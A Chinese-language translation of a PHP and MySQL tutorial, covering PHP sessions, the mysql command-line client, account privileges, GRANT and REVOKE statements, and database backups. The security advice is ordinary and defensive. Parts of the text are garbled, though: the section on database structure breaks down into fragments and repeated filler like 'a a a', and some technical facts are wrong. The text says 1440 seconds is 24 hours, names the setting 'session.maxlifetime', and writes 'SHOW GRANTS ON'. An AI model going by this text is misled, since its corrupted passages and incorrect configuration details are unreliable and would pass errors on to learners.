  $_SESSION['appStarted'] = true;\n$_SESSION['accessTime'] = date(\"M/d/Y g:i:\");\n\
  print \"This is page 1<br />\";\nprint \"You accessed the application at: \" . $_SESSION['accessTime'];\n\
  print \"<div><a href=\\\"page2.php\\\">Continue to next page</a></div>\";\n?>\n\
  ```\n\n然后你可以修改应用程序中的其他页面来检查此变量是否存在，如 Listing 6-5 所示。\n\n### Listing 6-5：检查全局 Session\n\
  \n```php\n<?php\nsession_start();\nif (!isset($_SESSION['appStarted'])) {\n    die(header(\"\
  Location: page1.php\"));\n}\nprint \"This is page 2<br />\";\nprint \"You accessed\
  \ the application at: \" . $_SESSION['accessTime'];\nprint \"<div><a href=\\\"page3.php\\\
  \">Continue to next page</a></div>\";\n?>\n```\n\n### 关闭 Session\n\n现在你知道如何启动 session，但如何关闭它呢？在\
  \ session 结束时，你可能需要销毁它。可以使用 `session_destroy()` 函数来销毁所有的 session 数据。\n\n```php\n\
  <?php\nsession_start();\n// ... 销毁 session ...\nsession_destroy();\n?>\n```\n\n\
  ### 使用 Session\n\n在 session 中存储数据后，你可以在多个页面之间共享它。正如 Listing 6-2 所示，我们在第一个页面设置了变量，并在第二个页面访问了它。\n\
  \n### Session 变量\n\n在 session 中存储的变量被称为 session 变量。如 Listing 6-3 所示，你应该在使用这些变量之前检查它们是否存在。\n\
  \n### Session 超时\n\nsession 有一个超时时间。你可以通过 [php.ini 文件](https://www.php.net/manual/en/php.ini.php#session.maxlifetime)\
  \ 更改 `session.maxlifetime` 配置。该值单位为秒。\n\n```ini\nsession.maxlifetime = 1440\n```\n\
  \n这表示 session 在 1440 秒（即 24 小时）后将变为失效。\n\n### Session Cookie\n\nsession 通常依赖于 cookie\
  \ 来识别用户。PHP 会使用一个名为 `PHPSESSID` 的 cookie 来跟踪 session。你可以通过 `php.ini` 禁用使用 cookie：\n\
  \n```ini\nsession.use_cookies = 0\n```\n\n如果禁用了 cookie，PHP 可能需要通过 URL 重写来传递 session\
  \ ID，但这通常是不安全的。\n\n\n\n\n\n# 第 1 章：简介 MySQL\n\n## 本章内容\n* 探索 MySQL 的工作原理\n* 与 MySQL\
  \ 通信\n* 保护存储在 MySQL 中的数据\n\n许多动态网站都需要后端数据库。数据库可以包含网页向用户显示的信息，或者数据库的作用可能是为了存储用户提供的信息。在某些应用程序中，数据库既提供可用信息又存储新信息。\n\
  \nMySQL 是网站中最常用的数据库，它的设计目标是快速且轻量级，专门为网站而设计。MySQL 在使用 PHP 编写的网站中特别受欢迎，因为 PHP 和 MySQL\
  \ 配合得很好。\n\n本章介绍了 MySQL，并解释了它的工作原理以及你如何与它进行通信。正如第四卷第 3 章 中提到的，大部分信息也适用于该章节介绍的 SQLite\
  \ 数据库。\n\n## 检查 MySQL 的工作原理\n\nMySQL 软件由 MySQL 服务器、若干辅助管理 MySQL 数据库的实用程序以及 MySQL\
  \ 服务器需要的某些支持软件组成（你不需要了解）。系统的核心是 MySQL 服务器。\n\nMySQL 服务器是数据库系统的管理器。它处理你所有的数据库指令。例如，如果你想创建一个新数据库，你会向\
  \ MySQL 服务器发送一条消息，例如：“创建一个新数据库并命名为 `newdata`”。随后 MySQL 服务器会在其数据目录中创建一个子目录，将该子目录命名为\
  \ `newdata`，并将具有所需格式的文件放入 `newdata` 子目录中。同样，要向该数据库添加数据，你需要向 MySQL 服务器发送一条消息，给它数据并告诉它你想将数据添加到何处。\n\
  \n在将指令传递给 MySQL 服务器之前，它必须正在运行并等待请求。MySQL 服务器通常被设置为在计算机启动时启动并持续运行。这是网站的通常设置。不过，没有必要将其设置为在计算机启动时启动。如果你需要，可以在访问数据库时随时手动启动它。当\
  \ MySQL 服务器运行时，它会持续监听直接发送给它的消息。安装和启动 MySQL 服务器将在第一卷第 4 章中讨论。\n\n## 理解数据库结构\n\nMySQL\
  \ 是一个关系型数据库管理系统 (RDBMS)。你的 MySQL 服务器可以同时管理许多数据库。事实上，许多人可能有很多数据库。\n\n### 构建数据库\n\
  MySQL MySQL 数据库 的。\n的数据库。\n### 与 MySQL 通信\n### 第 4 章：使用数据库\n### 添加一个 a a\n\n\n\n\
  \n\n在数据库中的信息\n### a 信息在一个一个\n\n a a a\n\n\n的 a a。\n关于数据库结构的更多信息请参见第 3 章。\n\n## 第\
  \ 5 章：通过 PHP 脚本与数据库通信\n\n### 了解 MySQL 和 PHP 如何协同工作\nPHP 和 MySQL 配合得很好。你需要理解它们如何与\
  \ MySQL 通信。\n\n### 与 MySQL 通信\n你与数据库的所有交互都是通过向 MySQL 服务器传递消息完成的。MySQL 服务器必须理解你发送的指令。你使用结构化查询语言\
  \ (SQL) 进行通信，这是一种至少以某种形式被数据库管理系统理解的标准语言。\n\n### 选择数据库\n### 处理 MySQL 错误\n### 使用其他有用的\
  \ mysqli 函数\n### 将 mysqli 函数转换为 mysql 函数\n\n## 构建 SQL 查询\n\nSQL 几乎就是英语；它主要由英语单词组成，并组合成听起来类似于英语句子的单词字符串。通常情况下（幸运的是），你不需要理解任何晦涩的技术语言就能编写可以运行的\
  \ SQL 查询。\n\n每个语句的第一个单词是它的名称，这是一个动词（动作词），告诉 MySQL 你想做什么。我们在本简书中讨论的语句有 `CREATE`、`DROP`、`ALTER`、`SHOW`、`INSERT`、`LOAD`、`SELECT`、`UPDATE`\
  \ 和 `DELETE`。这些基础词汇足以创建并与网站数据库交互。\n\n语句名称后面跟着单词和短语——有些是必须的，有些是可选的——告诉 MySQL 如何执行操作。例如，你总是需要告诉\
  \ MySQL 创建什么，以及要向哪个表插入数据或从哪个表中选择数据。\n\n下面是一个典型的 SQL 语句。如你所示，它使用了英语单词：\n\n```\nSELECT\
  \ lastName FROM Member\n```\n\n当语句使用 `SELECT` 时，它被称为查询，因为你正在数据库中查询信息。此查询检索存储在名为\
  \ `Member` 表中的所有姓氏。更复杂的查询（如下所示）则没那么像英语了：\n\n```\nSELECT lastName,firstName FROM\
  \ Member WHERE state=\"CA\" AND\n    city=\"Fresno\" ORDER BY lastName\n```\n\n\
  尽管这个查询不像英语，但它仍然非常清晰。\n\n![remember.eps](img/remember_fmt.png) 这里是构建 SQL 语句时需要注意的一些通用点，如前面的示例查询所示：\n\
  \n\n\n\n\n![check](img/check.png) 大写：在本书中，我们将 SQL 语言单词全部写为大写；而变量性信息的项（如列名）通常赋予全小写或大部分小写字母的标签。我们这样做是为了方便你阅读——而不是因为\
  \ MySQL 需要这种格式。SQL 单词的大小写并不重要；例如，对于 MySQL 来说，`select` 与 `SELECT` 相同，`from` 与 `FROM`\
  \ 相同。\n\n另一方面，如果你的操作系统是 Unix 或 Linux，那么表名、列名和其他变量信息的大小写就是重要的。当你使用 Unix 或 Linux 时，MySQL\
  \ 需要精确匹配列名，因此列名的大小写必须正确——例如，`lastname` 与 `lastName` 不同。然而，Windows 并不像 Unix 和 Linux\
  \ 那么挑剔；从它的角度来看，`lastname` 和 `lastName` 是相同的。\n\n![check](img/check.png) 空格：SQL 单词之间必须用一个或多个空格分隔。你使用多少个空格并不重要；你可以使用\
  \ 20 个空格，也可以只用 1 个空格。SQL 也不关注行尾。你可以在 SQL 语句的任何点开始新行，也可以将整个语句写在一行。\n\n![check](img/check.png)\
  \ 引号：注意在前面的查询中，`CA` 和 `Fresno` 被包含在双引号（\"）中。`CA` 和 `Fresno` 是一系列称为文本字符串或字符字符串的字符。你正在要求\
  \ MySQL 将 SQL 查询中的文本字符串与数据库中已存储的文本字符串进行比较。当你比较存储在数值列中的数字（如整数）时，不需要将数字括在引号中。（在本小型书籍的\
  \ 第 3 章 中，我们解释了你可以存储在 MySQL 数据库中的数据类型。）\n\n我们将在书中讨论其用处的章节中详细讨论特定 SQL 查询的细节。例如，在本小型书籍的\
  \ 第 3 章 中，当我们涵盖创建数据库结构的细节时，我们会详细讨论 `CREATE` 查询；当我们告诉你是如何向数据库添加数据时，我们还会讨论 `INSERT`\
  \ 查询。\n\n# 发送 SQL 查询\n\n你可以通过多种方式向 MySQL 发送 SQL 查询。在本书中，我们涵盖了发送查询的两种方法：\n\n![check](img/check.png)\
  \ mysql 客户端：当你安装 MySQL 时，会自动安装一个基于文本的 `mysql` 客户端。这个简单的客户端可以发送查询。\n\n![check](img/check.png)\
  \ PHP 内置函数：你通过使用专门为此设计的 PHP 内置函数从 PHP 脚本与 MySQL 数据库通信。这些函数连接到 MySQL 服务器并发送 SQL 查询。从\
  \ PHP 脚本访问 MySQL 数据库在本小型书籍的 第 5 章 中进行了详细讨论。\n\n## 使用 mysql 客户端\n\n安装 MySQL 时，还会安装一个名为\
  \ `mysql`（有时称为命令行界面或 `CLI`）的简单文本文本程序。与服务器通信的程序是客户端软件；因为这个程序与 MySQL 服务器通信信，所以它是一个客户端。当你在此客户端中输入\
  \ SQL 查询时，响应将返回给客户端并显示在屏幕上。监控程序可以跨网络发送查询；它不需要运行在存储数据库的机器上。\n\n该客户端在安装 MySQL 时始终会被安装，因此总是可用的。如果你熟悉\
  \ SQL 并且无无地输入查询，它非常简单快速。\n\n要从 `mysql` 客户端向 MySQL 发送 SQL 查询，请遵循以下步骤：\n\n1. 找到 `mysql`\
  \ 客户端。\n\n默认情况下，`mysql` 客户端程序安装在 MySQL 安装目录下的 `bin` 子目录下。在 Unix 和 Linux 中，默认路径是\
  \ `/usr/local/mysql/bin` 或 `/usr/local/bin`。在 Windows 中，默认是 `c:\\Program Files\\\
  MySQL\\MySQL Server 5.0\\bin`。然而，客户端可能安装在不同的目录。或者，如果你不是 MySQL 管理员，你可能无法访问 `mysql`\
  \ 客户端。\n\n![tip.eps](img/tip_fmt.png) 如果你不知道 MySQL 安装在哪里或无法运行客户端，请要求 MySQL 管理员将客户端放在你可以运行的地方，或者给你一个可以放在你自己的电脑上的副本。\n\
  \n2. 启动客户端。\n\n在 Unix 和 Linux 中，输入路径/文件名（例如 `/usr/local/mysql/bin/mysql`）。在 Windows\
  \ 中，打开命令提示符窗口然后输入路径\\文件名（例如 `c:\\Program Files\\MySQL\\MySQL Server 5.0\\bin\\mysql`）。如果你不需要使用账户名或密码，此命令将启动客户端。如果你需要输入帐户或密码或两者，请使用以下参数：\n\
  \n* `-u` `user`：`user` 是你的 MySQL 账户名。\n* `-p`：此参数提示你输入 MySQL 账户的密码。\n\n例如，如果你位于\
  \ `mysql` 客户端所在的目录，命令可能如下：\n\n```\nmysql -u root -p\n```\n\n3. 如果你启动 `mysql` 客户端是为了跨网络访问数据库，请在\
  \ `mysql` 命令后使用以下参数：\n\n`-h` `host`，其中 `host` 是 MySQL 机器的名字。\n\n例如，如果你位于 `mysql`\
  \ 客户端所在的目录，命令可能如下：\n\n```\nmysql -h mysqlhost.mycompany.com -u root -p\n```\n\n\
  输入命令后按回车。\n\n4. 在提示时输入你的密码。\n\n`mysql` 客户端启动，你会看到类似的内容：\n\n```\nWelcome to the MySQL\
  \ monitor. Commands end with ; or \\g.\nYour MySQL connection id is 459 to server\
  \ version: 5.0.15\nType 'help;' or '\\h' for help. Type '\\c' to clear the buffer.\n\
  mysql>\n```\n\n5. 选择你想要使用的数据库。\n\n在 `mysql` 提示符下，输入以下内容：\n\n```\nuse databasename\n\
  ```\n\n使用你想要查询的数据库名称。\n\n![remember.eps](img/remember_fmt.png) 某些 SQL 语句如 `SHOW\
  \ DATASES` 不需要选择数据库。对于这些语句，你可以跳过步骤 5。\n\n6. 在 `mysql` 提示符下，输入你的 SQL 语句并跟上分号（；），然后按回车。\n\
  \n![warning_bomb.eps](img/warning_fmt.png) 如果忘记在句尾输入分号（；），mysql 客户端执行语句。相反，它会继续显示提示符（mysq>）直到你输入分号。\n\
  \n语句的响应显示在屏幕上。\n\n7. 要退出 `mysql` 客户端，在提示符处输入 `quit` 然后按回车。\n\n你可以使用 `mysql` 客户端发送你自己输入的\
  \ SQL 语句，它会返回该语句的响应。\n\n# 保护你的 MySQL 数据库\n\n你需要控制对数据库信息的访问。你需要决定谁可以查看数据，谁可以更改。如果坏人获得了你客户的隐私信息（如信用卡号），你显然出了问题。你需要保护你的数据。\n\
  \nMySQL 提供了一个保护数据的安全系统。该系统包括：\n\n![check](img/check.png) MySQL 账户：没有账户，无人可以访问数据库中的数据。账户有一个必须使用的名称。账户还可以有一个密码，用户在访问账户前必须提供。此外，每个账户指定了你可以从哪里访问数据，例如仅从当前计算机或仅从特定域名。\n\
  \n\n\n\n\n你可以使用 SQL 查询来创建和删除账户、添加和更改密码，以及添加和移除权限。你可以使用前节描述的任一种方法发送 SQL 查询。你还可以使用\
  \ phpMyAdmin 提供的功能管理你的 MySQL 账户。我们将在本微型书籍的第 2 章中介绍管理 MySQL 数据库的方法。\n\n# 第 2 章：管理\
  \ MySQL\n\n## 本章内容\n* 管理 MySQL\n* 建立并控制对数据的访问\n* 创建和管理账户\n* 备份和恢复数据库\n* 获取最新版本的\
  \ MySQL\n\n如前讨论过的，`MySQL` 是一种数据库管理软件。它管理着包含你正在构建的动态网站所需信息的数据库。你的目标是在数据库中存储数据或从数据库中检索数据。你可以直接存储和检索数据（请参见本微型书籍的第\
  \ 3 章。如果 `MySQL` 运行在虚拟主机计算机上，则你不需要负责安装。\n* **启动和关闭 MySQL 服务器**。详见第一本书，第 4 章。如果 `MySQL`\
  \ 运行在虚拟主机计算机上，则你不需要启动或停止服务器。\n* **创建和维护 MySQL 用户账户**。没有账户，任何人都无法访问你数据库中的数据。账户需要安装和移除、添加或移除密码，并为账户分配或移除权限。我们将在本章稍后的设置\
  \ MySQL 账户 部分中介绍管理用户账户。如果你在虚拟主机公司使用 `MySQL`，你可能允许或不允许创建或更改 `MySQL` 账户。你可能被限制为一个具有定义权限的账户。\n\
  * **备份数据**。你需要保留数据的备份副本，以防数据丢失或损坏。如果你在虚拟主机公司使用 `MySQL`，你需要向该公司查询其备份程序。但你可能仍然想保留自己的备份，以防虚拟主机公司的备份程序故障。你可以在本章稍后的备份你的数据库\
  \ 部分中阅读有关备份数据库的知识。\n* **更新 MySQL**。在需要时安装新的 `MySQL` 版本。如果 `MySQL` 运行在虚拟主机计算机上，则你不需要负责更新。我们将在本章稍后的升级\
  \ MySQL 部分中讨论升级 `MySQL`。\n\n## 对数据的默认访问\n\n安装 `MySQL` 时，会安装一个名为 `root` 的默认 `MySQL`\
  \ 账户。有时，该账户在安装时是没有密码的。如果你在 Windows 上使用配置向导配置了 `MySQL`（见第一本书第 4 章），你会在配置过程中设置密码。此外，你可能设置了一个没有用户名也没有密码的匿名账户。如果你通过虚拟主机公司访问\
  \ `MySQL`，公司会为你提供使用的用户名和密码。\n\n通常情况下，你不应该使用没有密码的 `root` 账户。如果你的安装设置了一个没有密码的 `root`\
  \ 账户，请立即添加密码。`root` 账户配置了所有权限。你使用该账户管理你的 `MySQL` 数据库。你不需要拥有所有权限的账户即可访问 `MySQL` 数据库或添加检索数据。因此，在大多数情况下，你希望创建一个权限较小的账户来访问数据，我们将在本章中教你如何操作。\n\
  \n## 控制数据的访问\n\n你需要控制对数据库信息的访问。你需要决定谁可以查看数据，谁可以修改数据。想象一下，如果竞争对手可以修改你在线产品目录的信息或复制你的客户列表——你很快就会破产。显然，你需要保护你的数据。\n\
  \n幸运的是，`MySQL` 提供了一个保护数据的安全系统。没有账户，任何人无法访问你数据库中的数据。每个 `MySQL` 账户具有以下属性：\n\n* 账户名\n\
  * 主机——账户访问 MySQL 服务器的机器\n* 密码\n* 权限集\n\n要访问数据，必须使用有效的用户名并知道与账户关联的密码。此外，该人员必须从允许通过特定账户连接到数据库的计算机进行连接。\n\
  \n授予用户访问权限后，用户对数据能做什么取决于账户设置了哪些权限。每个账户被允许或不允许执行数据库中的操作，例如 `SELECT`、`DELETE`、`INSERT`、`CREATE`\
  \ 或 `DROP`。（表 2-1）在本章稍后解释了这些权限。）指定账户可以做什么的设置就是权限。\n\n\n\n\n## 2. 请求验证\n\n在 MySQL\
  \ 接受连接后，它会检查该账户是否具有执行指定语句所需的权限。如果是，MySQL 将执行该语句。\n\n你发送到 MySQL 的任何语句都可能失败，可能是因为第一步中连接被拒绝，也因为第二步中未允许该语句。系统将返回错误消息帮助你识别问题所在。\n\
  \n在接下来的章节中，我们将详细介绍账户和权限。\n\n### 账户名和主机名\n\n账户名和主机名（授权连接到数据库的计算机名称）共同标识了一个唯一的账户。可以存在两个同名但主机名不同的账户，它们可以拥有不同的密码和权限。然而，你不能拥有两个同名且主机名相同的账户。\n\
  \n只有当 MySQL 账户从 `hostname` 连接时，MySQL 服务器才会接受来自该账户的连接。当你构建 `GRANT` 或 `REVOKE` 语句时（我们将在本章后面的更改权限\
  \ 部分描述这些），你通过以下格式结合账户名和主机名来标识 MySQL 账户：`accountname``@``hostname`（例如，`root@localhost`）。\n\
  \n![remember.eps](img/remember_fmt.png) MySQL 账户名与 Unix、Linux 或 Windows 的用户名（有时也称为登录名）完全没有任何关系。如果你使用一个名为\
  \ `root` 的 MySQL 管理 账户，该账户与 Unix 或 Linux 的 `root` 登录名无关。更改 MySQL 账户名不会影响 Unix、Linux\
  \ 或 Windows 的登录名——反之亦然。\n\nMySQL 账户名和主机名具有以下特征：\n\n-   ![check](img/check.png) 账户名长度可达\
  \ 16 个字符。你可以在账户名中使用特殊字符，例如空格或连字符（`-`）。但是，你不能在账户名中使用通配符。\n\n-   ![check](img/check.png)\
  \ 账户名可以为空。如果 MySQL 中存在一个账户名为空的账户，那么任何账户名对于该账户都是有效的。如果用户从允许连接到空账户名的主机名连接，并使用了正确的密码（如果需要密码），则该用户可以使用任何账户名连接到你的数据库。你可以使用空名账户来允许匿名用户连接到你的数据库。\n\
  \n-   ![check](img/check.png) 主机名可以是名称或 IP 地址。例如，主机名可以是名称，如 `thor.mycompany.com`，也可以是\
  \ IP（互联网协议）地址，如 `192.163.2.33`。安装 MySQL 服务器的机器是 `localhost`。\n\n-   ![check](img/check.png)\
  \ 主机名可以包含通配符。你可以使用百分号（`%`）作为通配符；`%` 匹配任何主机。如果你为 `george@%` 添加了一个账户，使用 `george` 账户的人可以通过任何计算机连接到\
  \ MySQL 服务器。\n\n-   ![check](img/check.png) 主机名可以为空。将主机名留空同于使用 `%` 作为主机名。\n\n你可以创建一个账户名和主机名均空的账户（或者主机名使用百分号——`%`——）。这样的账户将允许任何人从任何计算机使用任何账户名连接到\
  \ MySQL 服务器。但你可能不需要这样的账户。这种账户在安装 MySQL 时有时会被创建，但它没有被赋予任何权限，因此什么也做不了。\n\n![warning_bomb.eps](img/warning_bomb_fmt.png)\
  \ 当安装 MySQL 时，它会自动安装一个拥有所有权限的账户：`root@localhost`。根据你的操作系统，该账户可能在没有密码的情况下安装。任何登录到安装\
  \ MySQL 的计算机的人都可以使用名为 `root` 的账户访问 MySQL 并对其进行任何操作。（当然，`root` 是一个众知的账户名，所以该账户是不安全的。如果你是\
  \ MySQL 管理员，请立即为该账户添加密码。）\n\n### 密码\n\n每个账户都设置了密码。如果没有为账户提供密码，则密码为空，这意味着不需要密码。MySQL\
  \ 对密码长度没有限制，但系统上的其他软件可能会将其限制为八位字符。如果是这样，八位之后的任何字符都会被丢弃。\n\n为了额外的安全，MySQL 在存储密码之前会对其进行加密。这意味着密码并不是以你输入的可识别字符存储的。这种安全措施确保没有人能简单地查看存储的密码并理解其内容。\n\
  \n遗憾的是，某些坏人可能会尝试通过猜你的密码来访问你的数据。他们使用软件快速连续地尝试不同的密码进行连接——这种做法被称为暴力破解。\n\n无论如何，你的 MySQL\
  \ 服务器都不应直接暴露在互联网上，因此攻击者需要先获取 MySQL 服务器的权限才能尝试暴力破解。\n\n### 账户权限\n\nMySQL 使用账户权限来指定谁可以做什么。任何使用有效账户的人都可以连接到\
  \ MySQL 服务器，但他或她只能执行该账户权限允许的操作。例如，可以设置一个账户，让用户可以选择数据但不能插入或更新数据。\n\n权限可以授予特定的数据库、表或列。例如，可以设置一个账户允许用户从数据库中的所有表中选择数据，但只能向一个表插入数据并仅更新一列。\n\
  \n表 2-1 列出了你可能想要授予或移除的一些权限。其他权限可用，但并不常用。你可以在 MySQL 在线手册的[`http://dev.mysql.com/doc/refman/5.6/en/privileges.html`](http://dev.mysql.com/doc/refman/5.6/en/privileges.html)查找完整的权限列表。\n\
  \n表 2-1 MySQL 权限\n\n| 权限 | 描述 |\n| :--- | :--- |\n| `ALL` | 所有权限 |\n| `ALTER` |\
  \ 可以更改表的结构 |\n| `CREATE` | 可以创建新的数据库或表 |\n| `DELETE` | 可以删除表行 |\n| `DROP` | 可以删除数据库或表\
  \ |\n| `FILE` | 可以读写服务器文件 |\n| `GRANT` | 可以更改 MySQL 账户的权限 |\n| `INSERT` | 可以表中插入新行\
  \ |\n| `SELECT` | 可以从表中读取数据 |\n| `SHUTDOWN` | 可以关闭 MySQL 服务器 |\n| `UPDATE` | 可以修改表数据\
  \ |\n| `USAGE` | 无权限 |\n\n![warning_bomb.eps](img/warning_bomb_fmt.png) 你可能不想授予\
  \ `ALL`，因为它包含了管理操作的权限，例如关闭 MySQL 服务器——你不希望除了你自己之外任何人拥有这些权限。\n\n### 设置 MySQL 账户\n\
  \n账户由账户名和允许从该账户访问 MySQL 的计算机名称来标识。当你创建一个新账户时，将其指定为 `accountname``@``hostname`。你可以在创建账户时指定密码，也可以在之后添加密码。你也可以在创建账户时设置权限，或在之后添加权限。\n\
  \nMySQL 安全数据库\n\n当安装 MySQL 时，它会自动创建一个名为 `mysql` 的数据库。所有保护你数据的信息都存储在该数据库中，包括账户名、主机名、密码和权限。\n\
  \n\n\n\n权限存储在列中。每个列名的格式为 `privilege_priv`，其中 `privilege` 是一个特定的账户权限。例如，包含 `ALTER`\
  \ 权限的列名为 `alter_priv`。每个权限列的值为 `Y` 或 `N`，表示“是”或“否”。因此，在用户表（在下文列表描述）中，会有一行代表一个账户，并有一列代表\
  \ `alter_priv`。如果 `alter_priv` 对应的账户字段包含 `Y`，则该账户可以执行 `ALTER` 语句。如果 `alter_priv`\
  \ 包含 `N`，则该账户没有执行 `ALTER` 语句的权限。\n\n`mysql` 数据库包含以下存储权限的表：\n\n![check.png](img/check.png)\
  \ `user` 表：此表存储适用于所有数据库和表的权限。它为每个有效账户都用有一行记录，其中包含 `user name`、`hostname` 和 `password`\
  \ 列。如果账户在此表中不存在，MySQL 服务器将拒绝其连接。\n\n![check.png](img/check.png) `db` 表：此表存储适用于特定数据库的权限。它为每个数据库用有一行，向指定的账户名和主机授予权限。该账户必须在\
  \ `user` 表中存在才能授予权限。在 `user` 表中授予的权限优于此表中的权限。\n\n例如，如果 `user` 表中账户 `designer` 的行记录授予了\
  \ `INSERT` 权限，那么 `designer` 就可以向所有数据库插入数据。如果 `db` 表中显示 `PetCatalog` 数据库中 `designer`\
  \ 账户的 `INSERT` 权限为 `N`，则以 `user` 表为准，`designer` 仍然可以在 `PetCatalog` 数据库中进行插入。\n\n\
  ![check.png](img/check.png) `host` 表：此表根据主机控制对数据库的访问。`host` 表与 `db` 表配合工作。如果 `db`\
  \ 表中的某行主机字段为空，MySQL 将检查 `host` 表查看该数据库在其中是否存在记录。通过这种方式，你可以允许某些主机访问某个数据库，但不允许其他主机访问。\n\
  \n例如，假设你有两个数据库：`db1` 和 `db2`。`db1` 数据库包含敏感信息，因此你只想让某些人看到它。`db2` 数据库包含你希望所有人看到的信息。如果你在\
  \ `db` 表中为 `db1` 设置了一行且 `host` 字段为空，你可以在 `host` 表中为 `db1` 设置两行。其中一行可以为从特定主机连接的用户授予所有权限，而另一行则可以拒绝从任何其他主机连接的用户的权限。\n\
  \n![check.png](img/check.png) `tables_priv` 表：此表存储适用于特定表的权限。\n\n![check.png](img/check.png)\
  \ `columns_priv` 表：此表存储适用于特定列的权限。\n\n如果你使用的是相应权限的账户，可以直接查看和更改 `mysql` 中的表。你可以使用如\
  \ `SELECT`、`INSERT` 和 `UPDATE` 等 SQL 查询语句。\n\n\n\n\n![remember.eps](img/remember_fmt.png)\
  \ 当你更改密码时，需要刷新权限以便 MySQL 能够看到变化。这可以通过 `FLUSH PRIVILEGES` 语句来实现：\n\n```sql\nFLUSH\
  \ PRIVILEGES\n```\n\n## 更改权限\n\n每个账户都有一组权限，规定了该账户的用户可以和不能做什么。你可以在创建账户时设置权限，也可以在任何时候更改账户的权限。为账户设置的最有用权限已在本章前面的部分给出，位于表\
  \ 2-1 中。\n\n你可以通过发送以下语句来查看账户的当前权限：\n\n```sql\nSHOW GRANTS ON accountname@hostname\n\
  ``````\n\n输出是一个用于创建当前账户的 `GRANT` 语句。输出显示了所有当前权限。如果你不包含 `ON` 子句，你将看到执行 `SHOW GRANTS`\
  \ 查询的账户的当前权限。\n\n你可以使用 `GRANT` 语句更改账户的权限，其通用格式如下：\n\n```sql\nGRANT privilege (columns)\
  \ ON tablename\nTO accountname@hostname IDENTIFIED BY 'password'\n```\n\n![remember.eps](img/remember_fmt.png)\
  \ 与其他权限相关的更改一样，在做出更改后，你需要使用 `FLUSH PRIVILEGES` 刷新权限。\n\n你还可以使用 `GRANT` 语句创建新账户或更改密码。你需要填写以下信息：\n\
  \n![check](img/check.png) `privilege (columns)`：你必须列出至少一个权限。你可以通过在权限后的括号中列出列名，将每个权限限制在一个或多个列上。如果你不列出列名，则该权限将授予表（s）中的所有列。你可以根据需要列出任意数量的权限和列，并用逗号分隔。你可以在表\
  \ 2-1 中看到出的可能的权限。例如，一个 `GRANT` 语句可能如下开头：\n\n```sql\nGRANT select (firstName,lastName),\
  \ update,\n      insert (birthdate) ...\n```\n\n![check](img/check.png) `tablename`：授予权限的表（或多个表）的。你需要至少包含一个表。你可以列出多个表，并用逗号分隔。`tablename`\
  \ 的可能值为：\n\n* `tablename`：当前数据库中名为 `tablename` 的整个表。你可以使用星号（`*`）表示当前数据库中的所有表。如果你使用星号且没有选择当前数据库，则权限将授予所有数据库中的所有表。\n\
  * `databasename.tablename`：`databasename` 中名为 `tablename` 的整个表。你可以在数据库名或表名处使用星号（`*`）表示所有数据库或表。使用\
  \ `*.*` 意味着授予所有数据库中所有表的权限。\n\n![check](img/check.png) `accountname@hostname`：如果账户已存在，则将赋予它指示的权限。如果账户不存在，则将其添加。该账户通过\
  \ `accountname` 和 `hostname` 配对来标识。如果存在一个具有指定账户名但主机名不同的现有账户，则不会更改现有账户，而是创建一个新账户。\n\
  \n![check](img/check.png) `password`：你正在添加或更改的密码。密码不是必须的。如果你不想为此账户添加或更改密码，请省略 `IDENTIFIED\
  \ BY 'password'` 短语。\n\n例如，为用于名为 `ProductCatalog` 的在线目录数据库的 PHP 脚本而添加新账户的 `GRANT`\
  \ 语句可能是：\n\n```sql\nGRANT select ON ProductCatalog.* TO phpuser@localhost\n    \
  \          IDENTIFIED BY 'A41!14a!'\n```\n\n要移除权限，请使用 `REVOKE` 语句。其通用格式为：\n\n```sql\n\
  REVOKE privilege (columns) ON tablename\nFROM accountname@hostname\n```\n\n你需要填写适当的信息。\n\
  \n你可以使用以下 `REVOKE` 语句移除账户的所有权限：\n\n```sql\nREVOKE all ON *.* FROM accountname@hostname\n\
  ```\n\n## 删除账户\n\n你可能想要删除一个账户。大多数情况下，有一个没有人使用的账户不会产生任何负面影响。但是，如果你认为某个账户已被攻破，出于安全考虑，你可能想要删除它。\n\
  \n要删除账户，可以使用 `DROP USER` 语句（在 MySQL 4.1.1 中引入），如下：\n\n```sql\nDROP USER accountname@hostname,\
  \ accountname@hostname, ...\n```\n\n你必须使用一个对 `mysql` 数据库拥有 `DELETE` 权限的账户来执行 `DROP\
  \ USER` 语句。\n\n![warning_bomb.eps](img/warning_bomb_fmt.png) `DROP USER` 的行为随着 MySQL\
  \ 版本发生了变化。从 MySQL 5.0.2 开始，它会移除账户及其相关的所有记录。\n\n## 备份你的数据库\n\n你至少需要一份数据库的备份副本。灾难很少发生，但确实会发生。存储数据库的计算机可能会故障，文件可能会损坏，建筑可能会火毁等等。数据库的备份副本可以防止此类灾难。\n\
  \n![remember.eps](img/remember_fmt.png) 你应该至少有一个存储在与当前使用的副本不同位置的备份副本。你可能应该有多个一个副本——可能多达三个。\n\
  \n以下是你可以存储副本的方式：\n\n![check](img/check.png) 第一份副本：存储在方便的地方，甚至可以存储在你存储数据库的同一台计算机上，以便快速替换损坏的数据库。\n\
  \n![check](img/check.png) 第二份副本：存储在另一台计算机上，以防存储数据库的计算机故障导致第一份副本不可用。\n\n![check](img/check.png)\
  \ 第三份副本：存储在不同的物理位置，以应对火灾的极端情况。如果你将第二份副本存储在另一个物理位置的计算机上，你就不需要第三份副本了。\n\n![tip.eps](img/tip_fmt.png)\
  \ 如果没有可以备份数据库的远程计算机，你可以将备份拷贝到便携介质（如 CD 或 DVD）并存储在境外。某些公司会收费为你存储这些介质，或者你也可以把介质放在口袋里带回家。\n\
  \n如果你在其他人的计算机上使用 MySQL（例如网络托管公司的计算机），提供访问服务的人员负责备份。他们应该建立了自动程序来对你的数据库进行备份。在评估网络托管公司时，询问备份程序。你想知道备份副本制作频率以及它们存储在哪里。如果你不确定数据是否安全，可以讨论备份程序的更改或增加。\n\
  \n![remember.eps](img/remember_fmt.png) 如果你是 MySQL 管理员，你负责制作备份。即使你在他人的计算机上使用 MySQL，你可能也想自己制作备份副本，以防万一。\n\
  \n在特定时间进行备份——至少每天一次。如果你的数据库更改频繁，你可能想更频繁地备份。例如，你可能想每小时备份到备份目录，但每天备份到另一台计算机一次。\n\n\
  \n\n\n你可以使用 MySQL 提供的名为 `mysqldump` 的实用程序来备份 MySQL 数据库。`mysqldump` 程序会创建一个文本文件，其中包含了重建整个数据库所需的所有\
  \ SQL 语句。该文件包含了每个表的 `CREATE` 语句以及表中每行数据的 `INSERT` 语句。你可以通过执行这组 MySQL 语句，将数据库恢复到其当前位置，或者恢复到另一台计算机上。\n\
